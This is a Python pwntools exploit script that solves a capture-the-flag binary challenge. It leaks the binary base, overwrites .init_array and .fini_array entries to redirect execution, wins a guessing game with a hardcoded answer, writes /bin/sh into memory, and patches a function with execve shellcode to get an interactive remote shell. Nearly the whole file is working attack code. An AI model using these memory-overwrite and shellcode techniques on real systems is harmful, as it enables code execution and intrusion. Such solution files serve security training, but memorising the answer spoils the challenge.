import argparse

from pwn import *
context.terminal = ['kitty']
context.arch = "amd64"

parser = argparse.ArgumentParser()
parser.add_argument("address", help="Address of challenge")
parser.add_argument("binary", help="Path to challenge binary")


args = parser.parse_args()

HOST, PORT = args.address.split(':')

r = remote(HOST, int(PORT))

b = ELF(args.binary)


def get_section_addr(name):
    return [i for i in b.sections if i.name == name][0].header.sh_addr


"""
Intended solution:
Overwrite init_rand_val init_array entry to early_mprotect
Overwrite first fini_array entry to write loop
Win guessing game
Write /bin/sh somewhere
Overwrite beginning of write loop func with shellcode while keeping inner loop intact
Write jump to shellcode
"""


def write_addr(addr, val):
    print(f"Writing 0x{val:x} to 0x{addr:x}")
    r.send(p64(addr))
    r.send(p64(val))

bin_base = u64(r.read(8))
print(f"{bin_base=:x}")

init_array = bin_base + get_section_addr('.init_array')
fini_array = bin_base + get_section_addr('.fini_array')
bss_section = bin_base + get_section_addr('.bss')

early_mprotect = bin_base + 0x1370
write_loop = bin_base + 0x2000

print(f"{init_array=:x}")
print(f"{fini_array=:x}")

# Overwrite init rand init_array entry
print("Overwrite init rand")
write_addr(init_array+8, early_mprotect)

# Write first fini_array entry to shellcode beginning
print("Write fini_array entry")
write_addr(fini_array, write_loop)

# First writes are done, exit write loop
print("Exit write loop")
r.send(p64(0))

# Send correct answer
print("Send correct answer")
r.send(p64(134775814))

# Now we return back to the write loop

# Write binsh somewhere
print("Write /bin/sh")
write_addr(bss_section, u64(b"/bin/sh\x00"))

# Write shellcode to function
shellcode = asm(f"""
xor rax, rax;
mov al, 0x3b;
mov rdi, 0x{bss_section:x};
xor rsi, rsi;
xor rdx, rdx;
syscall;
nop;
""")

shellcode_addr = write_loop

for i in range(0, len(shellcode), 8):
    print(f"Write shellcode[{i}:{i+8}]")
    write_addr(shellcode_addr + i, u64(shellcode[i:i+8]))


# Write jump to shellcode at beginning
write_addr(write_loop + 0xa9, u64(b'\xe9\x52\xff\xff\xff\x90\x90\x90')) # jmp to shellcode w nop padding

# Drop to shell
r.interactive()
